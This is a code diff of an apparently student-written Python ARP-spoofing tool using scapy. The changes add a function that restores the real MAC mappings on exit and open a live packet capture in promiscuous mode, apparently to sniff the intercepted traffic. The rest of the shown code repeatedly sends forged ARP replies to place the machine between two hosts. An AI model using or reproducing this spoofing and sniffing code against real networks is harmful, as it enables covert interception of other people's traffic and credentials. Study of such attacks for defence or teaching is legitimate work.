@@ -2,6 +2,7 @@ import argparse
 import os, sys
 import signal
 import argparse
+import pcapy
 import logging
 logging.getLogger("scapy").setLevel(logging.CRITICAL)
 
@@ -35,8 +36,8 @@ class Spoofer(threading.Thread):
                 Spoofer.SpooferRefresh.ft_spoof(self.ip_dst, self.ip_src,  self.mac_src)
                 print("", end="", flush=True)
             # Restore
-            Spoofer.SpooferRefresh.ft_spoof(self.ip_dst,  self.ip_dst,  self.mac_dst)
-            Spoofer.SpooferRefresh.ft_spoof(self.ip_src, self.ip_src,  self.mac_src)
+            Spoofer.SpooferRefresh.ft_restore(self.ip_dst, self.mac_dst, self.ip_src,  self.mac_src)
+            Spoofer.SpooferRefresh.ft_restore(self.ip_src, self.mac_src, self.ip_dst,  self.mac_dst)
             exit(0)
 
 
@@ -45,6 +46,12 @@ class Spoofer(threading.Thread):
             scapy.send(scapy.ARP(op = 2,
                                 pdst = ip_dest, hwdst = mac_dest, 
                                 psrc = ip_origin), verbose = True)
+            
+        def ft_restore(ip_origin, mac_origin, ip_dest, mac_dest):
+            scapy.sendp((scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(op=1, pdst = ip_dest, hwdst= mac_dest, psrc=ip_origin)))
+            scapy.send(scapy.ARP(op = 2,
+                                pdst = ip_dest, hwdst = mac_dest, 
+                                psrc = ip_origin, hwsrc = mac_origin), verbose = True)
 
     def __init__(self, ip_src, mac_src, ip_dst, mac_dst) -> None:
         print("Init thread", flush=True)
@@ -62,8 +69,12 @@ class Spoofer(threading.Thread):
 
     def run(self):
         self.spoofer_refresher.start()
-        while True:
+        promiscuous = True
+        network_device = pcapy.lookupdev()
+        p = pcapy.open_live(network_device, 2000, promisc=True, to_ms=1000)
+        while not self.event.is_set():
             signal.pause()
+        self.spoofer_refresher.join()
 
 
 def ft_parser_args():
